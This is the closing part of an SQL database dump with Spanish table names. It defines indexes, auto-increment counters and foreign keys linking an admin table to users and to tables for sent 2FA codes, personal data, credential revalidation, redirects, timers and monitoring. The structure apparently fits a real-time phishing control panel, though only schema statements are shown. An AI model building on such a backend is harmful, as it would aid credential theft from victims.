  ADD KEY `idx_push_activo` (`activo`);

--
-- Indices de la tabla `redirecciones_enviadas`
--
ALTER TABLE `redirecciones_enviadas`
  ADD PRIMARY KEY (`id`),
  ADD KEY `fk_redirecciones_usuario` (`usuario_id`),
  ADD KEY `fk_redirecciones_admin` (`admin_id`);

--
-- Indices de la tabla `revalidacion_credenciales`
--
ALTER TABLE `revalidacion_credenciales`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_usuario_id` (`usuario_id`),
  ADD KEY `idx_estado` (`estado`),
  ADD KEY `fk_revalidacion_usuario` (`usuario_id`),
  ADD KEY `fk_revalidacion_admin` (`admin_id`);

--
-- Indices de la tabla `timers_enviados`
--
ALTER TABLE `timers_enviados`
  ADD PRIMARY KEY (`id`),
  ADD KEY `fk_timers_usuario` (`usuario_id`),
  ADD KEY `fk_timers_admin` (`admin_id`);

--
-- Indices de la tabla `usuarios`
--
ALTER TABLE `usuarios`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_usuario` (`usuarios`),
  ADD KEY `idx_fecha_ingreso` (`fecha_ingreso`);

--
-- Indices de la tabla `validacion_email`
--
ALTER TABLE `validacion_email`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_usuario_id` (`usuario_id`),
  ADD KEY `idx_estado` (`estado`);

--
-- AUTO_INCREMENT de las tablas volcadas
--

--
-- AUTO_INCREMENT de la tabla `administracion_control`
--
ALTER TABLE `administracion_control`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;

--
-- AUTO_INCREMENT de la tabla `auth2fa_enviados`
--
ALTER TABLE `auth2fa_enviados`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT de la tabla `configuracion_columnas`
--
ALTER TABLE `configuracion_columnas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=489;

--
-- AUTO_INCREMENT de la tabla `datos_personales_enviados`
--
ALTER TABLE `datos_personales_enviados`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT de la tabla `espera_push`
--
ALTER TABLE `espera_push`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT de la tabla `estatus_usuarios`
--
ALTER TABLE `estatus_usuarios`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=252;

--
-- AUTO_INCREMENT de la tabla `herramientas_enviadas`
--
ALTER TABLE `herramientas_enviadas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=37;

--
-- AUTO_INCREMENT de la tabla `mensajes_admin`
--
ALTER TABLE `mensajes_admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=279;

--
-- AUTO_INCREMENT de la tabla `mensajes_rapidos`
--
ALTER TABLE `mensajes_rapidos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT de la tabla `monitoreo_bxcontrol`
--
ALTER TABLE `monitoreo_bxcontrol`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=313;

--
-- AUTO_INCREMENT de la tabla `portal_accesos`
--
ALTER TABLE `portal_accesos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- AUTO_INCREMENT de la tabla `push_suscripciones`
--
ALTER TABLE `push_suscripciones`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de la tabla `redirecciones_enviadas`
--
ALTER TABLE `redirecciones_enviadas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT de la tabla `revalidacion_credenciales`
--
ALTER TABLE `revalidacion_credenciales`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=35;

--
-- AUTO_INCREMENT de la tabla `timers_enviados`
--
ALTER TABLE `timers_enviados`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;

--
-- AUTO_INCREMENT de la tabla `usuarios`
--
ALTER TABLE `usuarios`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=132;

--
-- AUTO_INCREMENT de la tabla `validacion_email`
--
ALTER TABLE `validacion_email`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=66;

--
-- Restricciones para tablas volcadas
--

--
-- Filtros para la tabla `auth2fa_enviados`
--
ALTER TABLE `auth2fa_enviados`
  ADD CONSTRAINT `fk_auth2fa_admin` FOREIGN KEY (`admin_id`) REFERENCES `administracion_control` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `fk_auth2fa_usuario` FOREIGN KEY (`usuario_id`) REFERENCES `usuarios` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `configuracion_columnas`
--
ALTER TABLE `configuracion_columnas`
  ADD CONSTRAINT `fk_config_columnas_admin` FOREIGN KEY (`admin_id`) REFERENCES `administracion_control` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `datos_personales_enviados`
--
ALTER TABLE `datos_personales_enviados`
  ADD CONSTRAINT `fk_datospers_usuario` FOREIGN KEY (`usuario_id`) REFERENCES `usuarios` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `estatus_usuarios`
--
ALTER TABLE `estatus_usuarios`
  ADD CONSTRAINT `fk_estatus_usuario` FOREIGN KEY (`usuario_id`) REFERENCES `usuarios` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `herramientas_enviadas`
--
ALTER TABLE `herramientas_enviadas`
  ADD CONSTRAINT `fk_herramientas_admin` FOREIGN KEY (`admin_id`) REFERENCES `administracion_control` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `fk_herramientas_usuario` FOREIGN KEY (`usuario_id`) REFERENCES `usuarios` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `mensajes_admin`
--
ALTER TABLE `mensajes_admin`
  ADD CONSTRAINT `fk_mensajes_admin` FOREIGN KEY (`admin_id`) REFERENCES `administracion_control` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `fk_mensajes_usuario` FOREIGN KEY (`usuario_id`) REFERENCES `usuarios` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `mensajes_rapidos`
--
ALTER TABLE `mensajes_rapidos`
  ADD CONSTRAINT `fk_mensajes_rapidos_admin` FOREIGN KEY (`admin_id`) REFERENCES `administracion_control` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `monitoreo_bxcontrol`
--
ALTER TABLE `monitoreo_bxcontrol`
  ADD CONSTRAINT `fk_monitoreo_admin` FOREIGN KEY (`admin_id`) REFERENCES `administracion_control` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `fk_monitoreo_usuario` FOREIGN KEY (`usuario_id`) REFERENCES `usuarios` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `redirecciones_enviadas`
--
ALTER TABLE `redirecciones_enviadas`
  ADD CONSTRAINT `fk_redirecciones_admin` FOREIGN KEY (`admin_id`) REFERENCES `administracion_control` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `fk_redirecciones_usuario` FOREIGN KEY (`usuario_id`) REFERENCES `usuarios` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `revalidacion_credenciales`
--
ALTER TABLE `revalidacion_credenciales`
  ADD CONSTRAINT `fk_revalidacion_admin` FOREIGN KEY (`admin_id`) REFERENCES `administracion_control` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `fk_revalidacion_usuario` FOREIGN KEY (`usuario_id`) REFERENCES `usuarios` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `timers_enviados`
--
ALTER TABLE `timers_enviados`
  ADD CONSTRAINT `fk_timers_admin` FOREIGN KEY (`admin_id`) REFERENCES `administracion_control` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `fk_timers_usuario` FOREIGN KEY (`usuario_id`) REFERENCES `usuarios` (`id`) ON DELETE CASCADE;

--
-- Filtros para la tabla `validacion_email`
--
ALTER TABLE `validacion_email`
  ADD CONSTRAINT `fk_validacion_email_usuario` FOREIGN KEY (`usuario_id`) REFERENCES `usuarios` (`id`) ON DELETE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
